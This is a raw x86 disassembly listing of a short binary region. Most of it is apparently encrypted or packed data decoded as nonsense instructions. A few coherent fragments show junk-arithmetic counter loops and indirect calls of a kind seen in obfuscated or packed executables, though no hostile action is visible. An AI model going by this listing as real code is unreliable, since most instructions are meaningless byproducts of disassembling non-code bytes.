  412019:	add    al,0xf9
  41201b:	cmp    DWORD PTR [ebx+0x78],ebx
  41201e:	clc    
  41201f:	data16 daa 
  412021:	enter  0xd410,0xa1
  412025:	and    eax,0x7e260f95
  41202a:	mov    ds:0x5377e980,al
  41202f:	aas    
  412030:	jb     0x412033
  412032:	pop    ecx
  412033:	sbb    ebx,DWORD PTR [ebp+ecx*8-0x11]
  412037:	lods   al,BYTE PTR ds:[esi]
  412038:	cld    
  412039:	in     al,0x8a
  41203b:	adc    edx,esp
  41203d:	iret   
  41203e:	leave  
  41203f:	(bad)  
  412041:	push   ss
  412042:	mov    dh,0x8a
  412044:	(bad)  
  412045:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412046:	push   ebp
  412047:	test   al,0xda
  412049:	iret   
  41204a:	fiadd  DWORD PTR [ebx+0x1]
  41204d:	pop    edx
  41204e:	jmp    0xe3d57fc4
  412053:	sbb    DWORD PTR [eax+0x20ebc994],0x6a
  41205a:	sub    BYTE PTR [edx],ch
  41205c:	int    0x34
  41205e:	mov    ah,0xcc
  412060:	sub    ch,BYTE PTR [ebp+0x213b4726]
  412066:	je     0x4120db
  412068:	mov    BYTE PTR [edi+0x5b],cl
  41206b:	xor    DWORD PTR [ebp-0x46ad8540],ebx
  412071:	not    BYTE PTR [esp+ecx*1+0x62]
  412075:	jecxz  0x41205d
  412077:	push   ebx
  412078:	(bad)  
  412079:	std    
  41207a:	fwait
  41207b:	sub    al,0xf3
  41207d:	aad    0x4e
  41207f:	hlt    
  412080:	jmp    0x412011
  412082:	(bad)  
  412083:	int3   
  412084:	call   0xb395249f
  412089:	in     al,0xa2
  41208b:	outs   dx,DWORD PTR ds:[esi]
  41208c:	mov    ds:0xb26025dc,al
  412091:	push   ds
  412092:	pop    esi
  412093:	clc    
  412094:	repnz in al,0x15
  412097:	cwde   
  412098:	jle    0x4120a5
  41209a:	xchg   DWORD PTR [eax-0x37fa1725],edx
  4120a0:	or     esp,DWORD PTR ds:0x53c4ae6f
  4120a6:	jle    0x41210e
  4120a8:	lahf   
  4120a9:	mov    eax,DWORD PTR [ebp+0x8]
  4120ac:	mov    eax,DWORD PTR [eax]
  4120ae:	mov    ecx,DWORD PTR ds:0x41b224
  4120b4:	add    DWORD PTR [eax],ecx
  4120b6:	pop    esi
  4120b7:	pop    ebp
  4120b8:	ret    0x8
  4120bb:	push   ebp
  4120bc:	mov    ebp,esp
  4120be:	sub    esp,0x30
  4120c1:	and    ecx,DWORD PTR ds:0x42fd76
  4120c7:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  4120ce:	mov    eax,ds:0x42fcd5
  4120d3:	adc    DWORD PTR ds:0x42e6ef,eax
  4120d9:	mov    DWORD PTR [ebp-0x18],0xf89c8530
  4120e0:	sbb    DWORD PTR ds:0x42e6eb,0x6a34
  4120ea:	mov    ecx,DWORD PTR [ebp-0x4]
  4120ed:	sub    DWORD PTR ds:0x42e703,0x730a
  4120f7:	push   ebx
  4120f8:	mov    DWORD PTR ds:0x42e6fb,0x19
  412102:	cmp    DWORD PTR ds:0x42e6fb,0x0
  412109:	je     0x412140
  41210f:	cmp    DWORD PTR ds:0x42e6fb,0x1e
  412116:	jne    0x41212e
  41211c:	push   0x42fd7e
  412121:	push   0x0
  412123:	push   0x42e26d
  412128:	call   DWORD PTR ds:0x42e483
  41212e:	mov    ebx,DWORD PTR ds:0x42e6fb
  412134:	dec    ebx
  412135:	mov    DWORD PTR ds:0x42e6fb,ebx
  41213b:	jmp    0x412102
  412140:	mov    eax,0x7510855
  412145:	xor    ecx,eax
  412147:	sub    ebx,0x2eeb
  41214d:	mov    ebx,0x32729c
  412152:	sbb    DWORD PTR ds:0x42e120,0x42fd01
  41215c:	jmp    0x412440
  412161:	mov    edx,0xf222c858
  412166:	mov    dl,0x6a
  412168:	pop    eax
  412169:	dec    eax
  41216a:	xor    bh,0xa0
  41216d:	jae    0x412146
  41216f:	add    BYTE PTR [esi+eax*2],0x5f
  412173:	jo     0x4121e5
  412175:	mov    ecx,0x1670707e
  41217a:	xchg   edi,eax
  41217b:	mov    al,0xc8
  41217d:	mov    ds,WORD PTR [ebx-0x50a03d39]
  412183:	jmp    0x8d57dd8b
  412188:	mov    eax,ds:0x2e70a931
  41218d:	sahf   
  41218e:	jmp    FWORD PTR [edi-0x2a]
  412191:	lea    edx,[ecx-0x2a98e758]
  412197:	shl    BYTE PTR [ecx-0x3b],cl
  41219a:	xchg   edx,eax
  41219b:	stos   BYTE PTR es:[edi],al
  41219c:	mov    al,ds:0xce47d56d
  4121a1:	mov    ?,WORD PTR [ebx+0x58195799]
  4121a7:	ficomp DWORD PTR [eax+eiz*8]
  4121aa:	test   DWORD PTR fs:[ecx+eax*8+0x6c],ebx
  4121af:	and    BYTE PTR [edx+0x42],0xe4
  4121b3:	sub    eax,0x5407bd0f
  4121b8:	sahf   
  4121b9:	(bad)  
  4121ba:	push   ebp
  4121bb:	jecxz  0x412217
  4121bd:	out    dx,al
  4121be:	cwde   
  4121bf:	dec    edi
  4121c0:	test   BYTE PTR [ebx],bh
  4121c2:	lea    ecx,[ebx-0x11]
  4121c5:	mov    gs,WORD PTR [esi]
  4121c7:	call   0x9c0c:0x70872229
  4121ce:	inc    esi
  4121cf:	shl    DWORD PTR [edi],0xd3
  4121d2:	xor    esp,DWORD PTR [edi+esi*8+0x7d]
  4121d6:	repnz mov esi,0x17a12601
  4121dc:	or     BYTE PTR [bp-0x7e82],dh
  4121e1:	mov    bl,0x35
  4121e3:	mov    WORD PTR es:[edi],ss
  4121e6:	ins    DWORD PTR es:[edi],dx
  4121e7:	out    dx,eax
  4121e8:	xchg   ecx,eax
  4121e9:	xlat   BYTE PTR ds:[ebx]
  4121ea:	mov    ds:0x9c4b9047,eax
  4121ef:	mov    dl,0xdc
  4121f1:	in     eax,dx
  4121f2:	sub    al,0x66
  4121f4:	nop
  4121f5:	mov    ds:0xd0bc9a24,eax
  4121fa:	mov    cs,ecx
  4121fc:	adc    al,0x1d
  4121fe:	icebp  
  4121ff:	(bad)  
  412200:	pop    ebp
  412201:	rcr    DWORD PTR [edx+eax*1-0x79],0x9d
  412206:	push   0xc232f0ee
  41220b:	and    ch,BYTE PTR [ebx-0xb]
  41220e:	jl     0x41220f
  412210:	sub    DWORD PTR [esi+0x4394767],edi
  412216:	or     al,0x1d
  412218:	stc    
  412219:	inc    esi
  41221a:	sbb    esi,DWORD PTR [ecx+0x7a]
  41221d:	aaa    
  41221e:	pop    ss
  41221f:	mov    ds:0x780dd31,eax
  412224:	int3   
  412225:	adc    al,0xbf
  412227:	dec    ebx
  412228:	shl    ebx,cl
  41222a:	dec    ecx
  41222b:	or     eax,0x107ad0d5
  412230:	mov    ah,0x5e
  412232:	xor    al,0x6
  412234:	fmulp  st(7),st
  412236:	sar    ebx,1
  412238:	rcl    BYTE PTR [ecx],0xad
  41223b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41223c:	xchg   edi,eax
  41223d:	add    eax,0x430cc79b
  412242:	js     0x41228a
  412244:	retf   0x6ec7
  412247:	pop    edx
  412248:	sti    
  412249:	loopne 0x41223d
  41224b:	adc    eax,0x6ead794
  412250:	xor    BYTE PTR [ebp+0x773448b0],bl
  412256:	add    dl,cl
  412258:	lds    edi,FWORD PTR [edi+0x4e]
  41225b:	sbb    al,0xbc
  41225d:	sub    ebp,DWORD PTR [ebx+0x651c6434]
  412263:	jecxz  0x412209
  412265:	mov    ebp,0x53674e64
  41226a:	add    al,0x4
  41226c:	sbb    eax,0x81570115
  412271:	adc    BYTE PTR [ebx],bl
  412273:	and    al,0xf5
  412275:	dec    ecx
  412276:	sbb    BYTE PTR [ebp+0x23b491b6],al
  41227c:	mov    ds:0x39ed74c0,eax
  412281:	and    eax,0x81916360
  412286:	xchg   ebx,eax
  412287:	or     al,0x31
  412289:	inc    ebp
  41228a:	push   ebp
  41228b:	xchg   ecx,eax
  41228c:	dec    esp
  41228d:	cdq    
  41228e:	cmp    al,0x70
  412290:	pusha  
  412291:	in     al,0x8a
  412293:	adc    ecx,ebp
  412295:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412296:	jmp    FWORD PTR [ebx]
  412298:	lods   eax,DWORD PTR ds:[esi]
  412299:	mov    BYTE PTR [ecx+esi*1],dl
  41229c:	jp     0x412277
  41229e:	sbb    eax,0x379aaf32
  4122a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122a4:	mov    esp,0xc2b32f5
  4122a9:	stos   BYTE PTR es:[edi],al
  4122aa:	ret    
  4122ab:	pop    edi
  4122ac:	out    dx,al
  4122ad:	inc    ebp
  4122ae:	dec    ecx
  4122af:	xchg   ebx,eax
  4122b0:	stc    
  4122b1:	push   0xc35d0f5c
  4122b6:	adc    DWORD PTR [ebp+ecx*2-0x18f60d08],esp
  4122bd:	fs pop ebx
  4122bf:	pop    eax
  4122c0:	rol    ah,1
  4122c2:	test   DWORD PTR [ebp-0x62],ebx
  4122c5:	lock stc 
  4122c7:	push   edi
  4122c8:	mov    bh,0x3e
  4122ca:	jmp    FWORD PTR [ecx+edx*8+0x68]
  4122ce:	inc    ecx
  4122cf:	outs   dx,BYTE PTR ds:[esi]
  4122d0:	add    edi,DWORD PTR [edi-0xf]
  4122d3:	adc    BYTE PTR [ebx+0x70],dh
  4122d6:	cmp    eax,0xd5a3fd38
  4122db:	scas   al,BYTE PTR es:[edi]
  4122dc:	pop    edi
  4122dd:	std    
  4122de:	mov    ds:0x40f802c9,eax
  4122e3:	fs es je 0x4122bc
  4122e7:	xor    al,0x2
  4122e9:	into   
  4122ea:	add    BYTE PTR ds:0x18b72e0a,cl
  4122f0:	xor    al,BYTE PTR [ebp+0x5fe65852]
  4122f6:	sub    cl,dl
  4122f8:	jne    0x41227d
  4122fa:	add    DWORD PTR [ebx+0x25],0xffffff99
  4122fe:	cmp    DWORD PTR [ebp+ecx*2-0x18],esi
  412302:	xor    al,0x6c
  412304:	or     DWORD PTR [edi+esi*4],eax
  412307:	lods   al,BYTE PTR ds:[esi]
  412308:	jmp    0xf6da4d66
  41230d:	pushf  
  41230e:	mov    bh,0xd7
  412310:	sahf   
  412311:	mov    WORD PTR [edi],gs
  412313:	retf   0xbfa1
  412316:	inc    ecx
  412317:	sbb    edi,DWORD PTR [ecx+0x48]
  41231a:	mov    ebx,0xf50aa749
  41231f:	pop    esi
  412320:	lds    ecx,FWORD PTR [edx+0x341971bb]
  412326:	(bad)  
  412327:	out    dx,al
  412328:	mov    ebx,0x2cf29bbf
  41232d:	pop    ecx
  41232e:	loop   0x412329
  412330:	xor    eax,0x6ac6c7b7
  412335:	cmp    edi,ebp
  412337:	or     ch,al
  412339:	push   es
  41233a:	dec    esp
  41233b:	adc    eax,0xf93c1d0c
  412340:	sub    ebx,esp
  412342:	push   cs
  412343:	push   edi
  412344:	imul   BYTE PTR [edx+ebp*4+0x3b6b4786]
  41234b:	pop    ebp
  41234c:	or     ch,bh
  41234e:	mov    ds:0x8abac445,eax
  412353:	je     0x412391
  412355:	xor    DWORD PTR [edi+ecx*8],eax
  412358:	jp     0x41238e
  41235a:	mov    ebp,edi
  41235c:	sub    al,0xe1
  41235e:	imul   edi,DWORD PTR [edi+0x7a],0x2ab4e0a3
  412365:	loopne 0x412365
  412367:	ret    0x98bc
  41236a:	xchg   ecx,eax
  41236b:	inc    esp
  41236c:	ret    0x4f30
  41236f:	jge    0x41238d
  412371:	sub    BYTE PTR es:[esi],dl
  412374:	and    esp,esp
  412376:	push   edx
  412377:	adc    al,0xbd
  412379:	mov    edx,0x59571fb0
  41237e:	test   BYTE PTR [eax],bl
  412380:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412381:	and    ebp,ebp
  412383:	out    dx,al
  412384:	enter  0xbea1,0x50
  412388:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412389:	jno    0x412323
  41238b:	pop    ecx
  41238c:	jge    0x412323
  41238e:	test   edi,edx
  412390:	mov    dh,0x2c
  412392:	repnz adc dh,BYTE PTR [eax-0x4bc23356]
  412399:	dec    esp
  41239a:	cmp    esp,ecx
  41239c:	jno    0x41232a
  41239e:	adc    BYTE PTR [esp+eiz*8-0x7c256f4d],bl
  4123a5:	add    eax,0x8c02d034
  4123aa:	arpl   WORD PTR [ecx+0x67],bp
  4123ad:	xchg   edx,eax
  4123ae:	fst    QWORD PTR [eax+0x31e1ec1a]
  4123b4:	(bad)  
  4123b5:	sar    esi,1
  4123b7:	mov    BYTE PTR [ebp+edi*8-0x18],ch
  4123bb:	cmp    DWORD PTR [ebx],edx
  4123bd:	loope  0x412358
  4123bf:	aaa    
  4123c0:	push   ds
  4123c1:	xchg   ebp,eax
  4123c2:	push   esp
  4123c3:	(bad)  
  4123c4:	pushf  
  4123c5:	pop    esp
  4123c6:	scas   eax,DWORD PTR es:[edi]
  4123c7:	pop    ebp
  4123c8:	addr16 and ecx,edi
  4123cb:	pop    eax
  4123cc:	add    ebx,edi
  4123ce:	or     BYTE PTR [ebp+0xb4eda6e],dl
  4123d4:	xchg   ebp,eax
  4123d5:	sbb    eax,0x435fddbc
  4123da:	push   0x2e
  4123dc:	add    dl,0x31
  4123df:	ret    0xe0b3
  4123e2:	inc    edx
  4123e3:	dec    ecx
  4123e4:	shr    eax,1
  4123e6:	stos   DWORD PTR es:[edi],eax
  4123e7:	fcomp  QWORD PTR [ebx+0x7f]
  4123ea:	sub    al,0x18
  4123ec:	cli    
  4123ed:	dec    eax
  4123ee:	jae    0x412390
  4123f0:	call   0x16c4f758
  4123f5:	jo     0x41243f
  4123f7:	jmp    0x564e03b8
  4123fc:	into   
  4123fd:	sahf   
  4123fe:	xor    DWORD PTR [esi-0x4cec1f7],edx
  412404:	jmp    0xa847:0xd32a5fa3
  41240b:	lahf   
  41240c:	lahf   
  41240d:	add    al,0x5f
  41240f:	retf   
  412410:	fidiv  DWORD PTR [edx]
  412412:	in     eax,0x64
  412414:	daa    
  412415:	mov    eax,ds:0xa9e5acef
  41241a:	jmp    0x412416
  41241c:	pop    edx
  41241d:	sbb    DWORD PTR [edi-0x1be6c66f],ebx
  412423:	popf   
  412424:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412425:	mov    dh,0xba
  412427:	in     eax,0x19
  412429:	xor    DWORD PTR [ecx-0x35a312aa],0xffffffb6
  412430:	add    BYTE PTR [esi],ch
  412432:	cli    
  412433:	stc    
  412434:	lods   al,BYTE PTR ds:[esi]
  412435:	dec    edi
  412436:	push   esp
  412437:	aam    0xdb
  412439:	sbb    BYTE PTR [ebp+0x6b],0x10
  41243d:	push   ds
  41243e:	dec    ecx
  41243f:	adc    al,BYTE PTR [ebx]
  412441:	retf   
  412442:	sub    DWORD PTR ds:0x42fcf9,0xf96
  41244c:	jmp    0x412730
  412451:	hlt    
  412452:	xor    BYTE PTR [ebx+edi*8+0x74],bl
  412456:	fwait
  412457:	repz ja 0x41244c
  41245a:	inc    ecx
  41245b:	xchg   ecx,eax
  41245c:	aaa    
  41245d:	test   al,0x79
  41245f:	(bad)
  412462:	pop    esp
  412463:	jo     0x4124d5
  412465:	mov    ecx,0x770707e
  41246a:	xor    al,0x87
  41246c:	fnsave [ebx+0x43]
  41246f:	inc    eax
  412470:	iret   
  412471:	mov    eax,ds:0x4bc334e8
  412476:	in     eax,dx
  412477:	enter  0xb930,0xa9
  41247b:	push   es
  41247c:	adc    al,0xcd
  41247e:	inc    edi
  41247f:	js     0x412443
  412481:	mov    bl,BYTE PTR [esi+0x55]
  412484:	adc    al,0x50
  412486:	jb     0x412419
  412488:	pushf  
  412489:	jne    0x41242e
  41248b:	lock gs inc esi
  41248f:	push   es
  412490:	out    dx,eax
  412491:	mov    ds:0x77b5c2f0,al
  412496:	mov    ebp,0xbcaf8f30
  41249b:	cld    
  41249c:	mov    esp,0x5790492e
  4124a1:	fild   QWORD PTR [edx+0x3c]
  4124a4:	neg    DWORD PTR [eax+eiz*8+0x9162e1c]
  4124ab:	push   eax
  4124ac:	retf   
  4124ad:	xor    DWORD PTR [ebx],esi
  4124af:	loope  0x41250f
  4124b1:	or     eax,DWORD PTR [ebp-0x55d60cfc]
  4124b7:	adc    BYTE PTR [ecx-0x727cd696],cl
  4124bd:	xor    ebx,DWORD PTR [edi-0x54]
  4124c0:	push   ebp
  4124c1:	data16 fsub QWORD PTR [ebx]
  4124c4:	xchg   ebp,eax
  4124c5:	push   ebx
  4124c6:	arpl   WORD PTR [edi+edi*4],dx
  4124c9:	cmc    
  4124ca:	lea    ebx,[ebx+ebp*4+0x5596fd1d]
  4124d1:	arpl   WORD PTR [edx-0x1d104693],ax
  4124d7:	mov    al,0x30
  4124d9:	popa   
  4124da:	(bad)  
  4124db:	fimul  WORD PTR [esi]
  4124dd:	loope  0x41247f
  4124df:	ss push edi
  4124e1:	adc    eax,0x620c50d7
  4124e6:	add    DWORD PTR [esi],esp
  4124e8:	in     eax,dx
  4124e9:	neg    BYTE PTR [edx+eiz*4+0x2dc07662]
  4124f0:	adc    eax,0x3b5e0aeb
  4124f5:	mov    ds:0xc0302da5,al
  4124fa:	cmp    DWORD PTR fs:[ebx-0x38],esp
  4124fe:	xor    ecx,DWORD PTR [edx+0x3adfa24b]
  412504:	mov    ecx,0xda49044d
  412509:	lods   al,BYTE PTR ds:[esi]
  41250a:	jbe    0x41250d
  41250c:	jnp    0x41248f
  41250e:	mov    ch,0x5a
  412510:	call   0xb0d6:0xa2749ce2
  412517:	rol    BYTE PTR [esi-0x44],0x97
  41251b:	xor    eax,0x3cfdef27
  412520:	jp     0x4124be
  412522:	ficomp DWORD PTR [esi*2+0x4bf154b1]
  412529:	mov    bl,0xa3
  41252b:	jge    0x41251a
  41252d:	out    dx,al
  41252e:	fidivr DWORD PTR [ecx+0x36b0d0a8]
  412534:	popa   
  412535:	inc    ebx
  412536:	pop    esp
  412537:	jb     0x4125b6
  412539:	mov    ds:0x7c30355c,eax
  41253e:	xchg   edi,eax
  41253f:	lods   al,BYTE PTR ds:[esi]
  412540:	(bad)  
  412541:	outs   dx,DWORD PTR ds:[esi]
  412542:	jns    0x41250e
  412544:	lods   al,BYTE PTR ds:[esi]
  412545:	cs repz push cs
  412548:	lds    ebp,FWORD PTR fs:[edi+0x27]
  41254c:	(bad)  
  41254d:	cs pop eax
  41254f:	mov    esi,0x7defac1d
  412554:	dec    ecx
  412555:	cmp    al,0xba
  412557:	add    BYTE PTR [esi+0x16160f3a],0x6
  41255e:	je     0x412511
  412560:	dec    DWORD PTR [ecx]
  412562:	jecxz  0x412551
  412564:	push   0xffffffc8
  412566:	test   al,0x69
  412568:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412569:	jno    0xddec4748
  41256f:	pushf  
  412570:	icebp  
  412571:	pop    edi
  412572:	data16 (bad) 
  412574:	xchg   BYTE PTR [ecx+0x57],bl
  412577:	push   cs
  412578:	mov    bh,0xc7
  41257a:	shl    DWORD PTR [ecx+0x64],0x17
  41257e:	cmp    DWORD PTR [ecx+0x1f06b1ba],ebx
  412584:	inc    ebp
  412585:	daa    
  412586:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412587:	fidiv  WORD PTR [esi-0x44]
  41258a:	out    0x88,al
  41258c:	hlt    
  41258d:	mov    ah,0xc
  41258f:	(bad)  
  412591:	dec    edi
  412592:	xchg   BYTE PTR gs:[ebp-0x6d],dl
  412596:	ror    DWORD PTR [esi-0x5d],0x3a
  41259a:	(bad)  
  41259b:	imul   ebp,DWORD PTR [ebx],0xdef923cc
  4125a1:	(bad)  
  4125a2:	gs in  eax,0x97
  4125a5:	jmp    0x412612
  4125a7:	jns    0x41258a
  4125a9:	aaa    
  4125aa:	push   ss
  4125ab:	fild   DWORD PTR ds:0x20587741
  4125b1:	(bad)  fs:[eax+0x51014265]
  4125b9:	sub    edi,DWORD PTR [esi]
  4125bb:	(bad)  
  4125bc:	sbb    bh,BYTE PTR [edx+0xbc17570]
  4125c2:	lea    ebp,[edx-0x39]
  4125c5:	push   esp
  4125c6:	and    ecx,DWORD PTR [eax-0x57d9e171]
  4125cc:	ja     0x412605
  4125ce:	cmp    eax,0x59860d85
  4125d3:	mov    eax,ds:0xdc697db5
  4125d8:	xor    al,0x3a
  4125da:	cmp    eax,DWORD PTR [ebx+0x141d998e]
  4125e0:	mov    ebx,0x24738ba1
  4125e5:	xor    eax,0xc4a714b5
  4125ea:	cld    
  4125eb:	push   0xb80b5f4e
  4125f0:	ficomp DWORD PTR [ecx+0xd1608f7]
  4125f6:	xchg   ecx,eax
  4125f7:	fistp  QWORD PTR [edi+0x5f701ad0]
  4125fd:	enter  0x45ba,0xa3
  412601:	aad    0x0
  412603:	sub    eax,0xe6ad4e2c
  412608:	jecxz  0x4125bb
  41260a:	ds lahf 
  41260c:	outs   dx,BYTE PTR ds:[esi]
  41260d:	mov    ebx,0x61c5fd90
  412612:	fistp  WORD PTR [ebp-0x39]
  412615:	inc    ebp
  412616:	inc    edi
  412617:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412618:	fidiv  WORD PTR [ebp+0x7e]
  41261b:	ins    BYTE PTR es:[edi],dx
  41261c:	cli    
  41261d:	daa    
  41261e:	cwde   
  41261f:	xor    eax,0x936b2deb
  412624:	or     al,0xca
  412626:	sbb    BYTE PTR [ebx+0x5dc9332c],dh
  41262c:	jnp    0x41262a
  41262e:	push   eax
  41262f:	outs   dx,DWORD PTR ds:[esi]
  412630:	clc    
  412631:	xchg   ecx,eax
  412632:	sub    BYTE PTR ds:0x68667417,cl
  412638:	xchg   DWORD PTR [edx+ecx*2+0x41c1059d],edi
  41263f:	dec    ebp
  412640:	adc    eax,0x55d53253
  412645:	xacquire xchg DWORD PTR [esi+0x15],ecx
  412649:	jle    0x412691
  41264b:	pop    esp
  41264c:	ins    DWORD PTR es:[edi],dx
  41264d:	imul   edx,DWORD PTR [esi+0x6a169d42],0x3baf829
  412657:	clc    
  412658:	add    esi,DWORD PTR [ecx+0x6c]
  41265b:	rcl    DWORD PTR [edx],1
  41265d:	test   BYTE PTR [edx-0x7ea2ef4c],cl
  412663:	adc    al,0x32
  412665:	mov    WORD PTR [edi+0x69e28938],fs
  41266b:	inc    edx
  41266c:	mov    dh,0x30
  41266e:	fs jmp 0x4322:0x88b460d9
  412676:	mov    esp,0x7db12a61
  41267b:	loope  0x4126ea
  41267d:	sahf   
  41267e:	adc    al,dl
  412680:	cmp    eax,0x3a770633
  412685:	jge    0x4126a2
  412687:	call   0x1fc084d5
  41268c:	retf   
  41268d:	push   0x73d4a8ce
  412692:	mov    edi,0x1c42af39
  412697:	xor    eax,0xb015d4dc
  41269c:	shl    DWORD PTR [edx],0x66
  41269f:	clc    
  4126a0:	mov    ah,0xf8
  4126a2:	cmp    bh,BYTE PTR [eax+ecx*4]
  4126a5:	aas    
  4126a6:	int    0xe3
  4126a8:	mov    ebp,0xbafeddb2
  4126ad:	shl    BYTE PTR [esi+0x7d],0xc0
  4126b1:	sbb    al,ah
  4126b3:	jl     0x412695
  4126b5:	or     al,0x7e
  4126b7:	retf   0xd5b
  4126ba:	(bad)  
  4126bb:	adc    BYTE PTR [ebp+0x5400fa9d],ah
  4126c1:	test   BYTE PTR [ebx-0x16],ah
  4126c4:	sbb    eax,0x5a47a140
  4126c9:	cmc    
  4126ca:	mov    es,WORD PTR [edx-0x64]
  4126cd:	mov    dh,0x3b
  4126cf:	scas   eax,DWORD PTR es:[edi]
  4126d0:	jp     0x4126e1
  4126d2:	sti    
  4126d3:	mov    eax,ds:0x7fa7ee26
  4126d8:	ins    BYTE PTR es:[edi],dx
  4126d9:	sub    dl,BYTE PTR [ebp+0x4b0c728f]
  4126df:	stos   BYTE PTR es:[edi],al
  4126e0:	sub    BYTE PTR [edi-0x57],dh
  4126e3:	scas   eax,DWORD PTR es:[edi]
  4126e4:	ins    DWORD PTR es:[edi],dx
  4126e5:	out    0x4c,eax
  4126e7:	mov    eax,DWORD PTR [ecx+0x1f]
  4126ea:	dec    eax
  4126eb:	popa   
  4126ec:	shl    BYTE PTR [edx-0x73],1
  4126ef:	push   cs
  4126f0:	scas   al,BYTE PTR es:[edi]
  4126f1:	jg     0x41275b
  4126f3:	jbe    0x4126ae
  4126f5:	mov    edx,0x91bb0f5f
  4126fa:	nop
  4126fb:	lods   al,BYTE PTR ds:[si]
  4126fd:	into   
  4126fe:	retf   
  4126ff:	fistp  QWORD PTR [ebp+0x1c]
  412702:	inc    esp
  412703:	outs   dx,BYTE PTR ds:[esi]
  412704:	fidivr WORD PTR [edx+0x2ad0de47]
  41270a:	cmp    eax,0xac34b446
  41270f:	inc    edi
  412710:	push   0x7dc0116a
  412715:	pop    esp
  412716:	mov    ebp,0x250e0e0d
  41271b:	xchg   ebp,eax
  41271c:	jecxz  0x412784
  41271e:	cdq    
  41271f:	sub    bl,BYTE PTR [edx+0x55]
  412722:	xchg   esi,eax
  412723:	out    0x9b,eax
  412725:	jecxz  0x4126d9
  412727:	(bad)  
  412728:	adc    bl,al
  41272a:	xor    dh,dh
  41272c:	fbstp  TBYTE PTR [esi]
  41272e:	lock mov WORD PTR [ebp-0x1c],cx
  412733:	and    DWORD PTR ds:0x42fd76,0x0
  41273d:	jmp    0x412751
  412742:	xor    ecx,ecx
  412744:	or     ecx,DWORD PTR ds:0x42fd76
  41274a:	inc    ecx
  41274b:	mov    DWORD PTR ds:0x42fd76,ecx
  412751:	cmp    DWORD PTR ds:0x42fd76,0x1c
  412758:	jae    0x41279b
  41275e:	cmp    DWORD PTR ds:0x42fd76,0x11
  412765:	jne    0x41277c
  41276b:	push   0x5b8f
  412770:	push   DWORD PTR [ebp-0x20]
  412773:	push   DWORD PTR [ebp-0x14]
  412776:	call   DWORD PTR ds:0x42e313
  41277c:	cmp    DWORD PTR ds:0x42fd76,0x10
  412783:	jne    0x412796
  412789:	mov    ecx,DWORD PTR ds:0x42fd76
  41278f:	inc    ecx
  412790:	mov    DWORD PTR ds:0x42fd76,ecx
  412796:	jmp    0x412742
  41279b:	mov    ecx,DWORD PTR [ebp+0x14]
  41279e:	push   esi
  41279f:	xor    DWORD PTR ds:0x42fd6e,0x1648
  4127a9:	push   edi
  4127aa:	test   ecx,ecx
  4127ac:	jmp    0x412a90
  4127b1:	mov    ds:0xc112c158,eax
  4127b6:	mov    cl,0x73
  4127b8:	jne    0x4127c0
  4127ba:	jne    0x4127b4
  4127bc:	sub    edx,DWORD PTR [ebp-0x373eed7b]
  4127c2:	pop    ecx
  4127c3:	jo     0x412835
  4127c5:	mov    ecx,0xee70707e
  4127ca:	repnz add BYTE PTR [ecx+0x9],ah
  4127ce:	(bad)  
  4127cf:	jnp    0x412765
  4127d1:	push   ebp
  4127d2:	xchg   esi,eax
  4127d3:	ja     0x412848
  4127d5:	adc    DWORD PTR [edx],0x31
  4127d8:	sbb    DWORD PTR [ebx-0x2fe8c377],esi
  4127de:	fwait
  4127df:	mov    dl,0xd7
  4127e1:	leave  
  4127e2:	dec    esp
  4127e3:	inc    ebp
  4127e4:	xor    ebp,0xa4ce6844
  4127ea:	mov    cl,0x41
  4127ec:	daa    
  4127ed:	arpl   WORD PTR [esp+edx*4-0x7b],dx
  4127f1:	ret    0xaa24
  4127f4:	ficomp WORD PTR [ecx]
  4127f6:	mov    dh,0xcf
  4127f8:	adc    cl,bh
  4127fa:	mov    bh,BYTE PTR [eax*8+0x455cf1a8]
  412801:	aaa    
  412802:	sbb    eax,0xe968137a
  412807:	lea    ebp,[ebx]
  412809:	sub    BYTE PTR [ebx+ebp*1+0x2b],0x7
  41280e:	sti    
  41280f:	jmp    0x412848
  412811:	icebp  
  412812:	lods   eax,DWORD PTR ds:[esi]
  412813:	and    al,0x52
  412815:	or     BYTE PTR [edx+0xf],cl
  412818:	arpl   WORD PTR [eax+0x4725e2b6],di
  41281e:	outs   dx,DWORD PTR ds:[esi]
  41281f:	and    eax,0xfdf3088
  412824:	adc    eax,0xc6db925f
  412829:	inc    esi
  41282a:	sbb    al,0x38
  41282c:	jno    0x4127fa
  41282e:	fst    QWORD PTR [ecx]
  412830:	hlt    
  412831:	in     al,0xbb
  412833:	aad    0xb
  412835:	nop
  412836:	int    0x92
  412838:	(bad)  
  412839:	aad    0xf7
  41283b:	leave  
  41283c:	cs jae 0x412833
  41283f:	loopne 0x41289d
  412841:	xor    BYTE PTR [ebp-0x6e],bl
  412844:	mov    esp,DWORD PTR [ebp-0x79]
  412847:	cli    
  412848:	xor    cl,BYTE PTR [ebx-0x6c]
  41284b:	cmp    BYTE PTR [edi-0x37deb7f6],ah
  412851:	and    BYTE PTR [ecx+ebp*4],0x81
  412855:	adc    ecx,DWORD PTR [edx]
  412857:	out    0xd8,eax
  412859:	prefetch BYTE PTR [esi+0x47]
  41285d:	and    DWORD PTR [esi],eax
  41285f:	fnstcw WORD PTR ds:0xcf65203d
  412865:	sub    al,0xf1
  412867:	arpl   dx,cx
  412869:	xchg   esi,eax
  41286a:	sbb    DWORD PTR [ebp-0x1b],0x7f7a1c60
  412871:	xlat   BYTE PTR ds:[ebx]
  412872:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412873:	adc    eax,0x2d0badfe
  412878:	das    
  412879:	lods   al,BYTE PTR ds:[esi]
  41287a:	dec    edi
  41287c:	cmp    al,BYTE PTR [eax+0x59]
  41287f:	std    
  412880:	fst    DWORD PTR [ebx]
  412882:	xor    eax,esi
  412884:	bound  edi,QWORD PTR [ebp-0x52]
  412887:	outs   dx,BYTE PTR ds:[esi]
  412888:	and    eax,DWORD PTR [edx+0x33]
  41288b:	jge    0x4128aa
  41288d:	retf   0x7305
  412890:	mov    eax,ds:0x505bd254
  412895:	dec    edi
